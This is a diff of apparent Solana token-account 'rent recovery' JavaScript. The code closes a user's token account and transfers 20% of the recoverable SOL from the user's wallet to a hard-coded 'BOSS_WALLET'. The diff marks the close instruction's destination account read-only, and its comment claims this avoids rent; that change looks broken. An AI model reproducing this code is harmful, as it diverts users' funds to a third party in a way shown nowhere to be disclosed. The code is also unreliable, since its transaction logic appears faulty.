@@ -1242,7 +1242,7 @@ async function scanTokens() {
 
       
         // ===== RÉCUPÉRATION CORRIGÉE =====
-   async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
+       async function realRecoverRent(tokenAccountAddress, recoverableSOL) {
     try {
         console.log("🔧 DEBUG: Début de realRecoverRent");
         
@@ -1250,35 +1250,35 @@ async function scanTokens() {
         const tokenPublicKey = new solanaWeb3.PublicKey(tokenAccountAddress);
         const bossPublicKey = new solanaWeb3.PublicKey(REAL_CONFIG.BOSS_WALLET);
 
-        // CALCUL SIMPLE POUR TEST
+        // CALCUL
         const totalLamports = Math.floor(recoverableSOL * 1000000000);
-        const bossLamports = Math.floor(totalLamports * 0.20); // 20%
-        const userLamports = totalLamports - bossLamports; // 80%
+        const bossLamports = Math.floor(totalLamports * 0.20);
+        const userLamports = totalLamports - bossLamports;
 
         console.log("💰 Lamports - Total:", totalLamports, "Boss:", bossLamports, "User:", userLamports);
 
         const transaction = new solanaWeb3.Transaction();
 
-        // 1. COMPUTE BUDGET SEULEMENT
+        // 1. COMPUTE BUDGET
         const computeBudgetIx = solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
             units: 200000
         });
         transaction.add(computeBudgetIx);
 
-        // 2. FERMETURE TOKEN
+        // 2. FERMETURE TOKEN - CORRECTION IMPORTANTE !
         console.log("🔓 Ajout instruction fermeture...");
         const closeInstruction = new solanaWeb3.TransactionInstruction({
             keys: [
-                { pubkey: tokenPublicKey, isSigner: false, isWritable: true },
-                { pubkey: userPublicKey, isSigner: false, isWritable: true },
-                { pubkey: userPublicKey, isSigner: true, isWritable: false },
+                { pubkey: tokenPublicKey, isSigner: false, isWritable: true },    // Account à fermer
+                { pubkey: userPublicKey, isSigner: false, isWritable: false },    // ✅ READ-ONLY pour éviter rent!
+                { pubkey: userPublicKey, isSigner: true, isWritable: false },     // Autorité
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
             data: new Uint8Array([9])
         });
         transaction.add(closeInstruction);
 
-        // 3. TRANSFERT BOSS SEULEMENT (simplifié)
+        // 3. TRANSFERT BOSS
         console.log("🤵 Ajout transfert boss...");
         const bossTransfer = solanaWeb3.SystemProgram.transfer({
             fromPubkey: userPublicKey,
